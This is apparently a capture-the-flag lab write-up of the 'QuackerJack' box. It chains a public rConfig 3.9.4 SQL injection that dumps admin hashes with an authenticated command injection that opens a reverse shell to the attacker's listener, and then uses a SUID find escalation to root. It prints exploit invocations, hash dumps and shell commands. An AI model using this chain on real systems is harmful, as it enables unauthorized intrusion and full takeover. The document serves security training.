#Linux #rConfig #SQLInjection #HashCracking #CommandInjection #SUID #find #GTFOBins

## Overview

QuackerJack is a Linux box running rConfig 3.9.4 on port 8081. A SQL injection vulnerability leaks the admin password hash, cracking it gives access to the panel, and a second authenticated command injection exploit provides a shell as `apache`. From there, a SUID `find` binary is the entire privilege escalation.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2  (anonymous login allowed)
22/tcp   open  ssh         OpenSSH 7.4
80/tcp   open  http        Apache httpd 2.4.6 (CentOS) PHP/5.4.16
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.10.4
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 (CentOS) PHP/5.4.16
```

Port 80 is a default Apache CentOS test page. Gobuster found nothing interesting there. Port 8081 hosts:

```
rConfig Version 3.9.4
```

Searchsploit for `rConfig 3.9` yields multiple results. Two are relevant:

```
rConfig 3.9 - 'searchColumn' SQL Injection
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection (authenticated)
```

## Foothold

### SQL Injection to Extract Admin Hash

The SQL injection exploit runs unauthenticated and dumps user credentials from the database:

```sh
python3 48208.py https://192.168.206.57:8081/
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.206.57:8081//commands.inc.php
[+] Extracting the current DB name: rconfig
[+] Extracting 10 first users:
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
fbesamqurx:365:21232f297a57a5a743894a0e4a801fc3
```

> **Why SQL injection in admin panels is so useful:** Even if you can't use an SQLi to get a shell directly, dumping the users table gives you credential material. An MD5 hash (the `$` prefix is absent) is fast to crack against a rainbow table or common wordlist.

`dc40b85276a1f4d7cb35f154236aa1b2` cracked via CrackStation:

```
‹redacted›
```

Credentials:

```
admin : ‹redacted›
```

### Authenticated Command Injection

With valid admin credentials, the second exploit applies:

```
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection
```

Running it with the recovered credentials and a Kali listener on port 80:

```python
python3 48241.py https://192.168.206.57:8081 admin ‹redacted› 192.168.45.167 80
```

Shell caught as `apache`:

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.57] 49978
bash-4.2$ whoami
apache
```

TTY upgrade:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### SUID find

LinPEAS identifies the `find` binary with the SUID bit set:

```sh
-rwsr-xr-x. 1 root root 195K Oct 30  2018 /usr/bin/find
```

> **Why SUID on `find` is a root shell:** When a binary has the SUID bit, it runs with the file owner's privileges (root here) regardless of who executes it. `find` supports `-exec`, which runs arbitrary commands as part of its search. Combining these: `find . -exec /bin/sh -p \; -quit` launches a shell with `-p` (preserve SUID effective UID), which is a root shell.

```sh
bash-4.2$ find . -exec /bin/sh -p \; -quit
sh-4.2# whoami
root
```

## Root

```sh
sh-4.2# cat proof.txt
‹redacted›
```

## Takeaways

- **Layer exploits: unauthenticated SQLi feeds the authenticated RCE.** Neither exploit alone is enough without the other; the chain is: dump hash, crack hash, authenticate, execute.
- **SUID binaries on GTFOBins are immediate privesc.** Any binary in `find / -perm -4000` output should be cross-referenced with GTFOBins before anything else. `find`, `vim`, `python`, `perl` with SUID all give root in one command.
- **`apache` runs web processes on many CentOS installs.** Landing as `apache` rather than `www-data` is a CentOS-ism, not a different privilege level, still a low-privilege web process user.
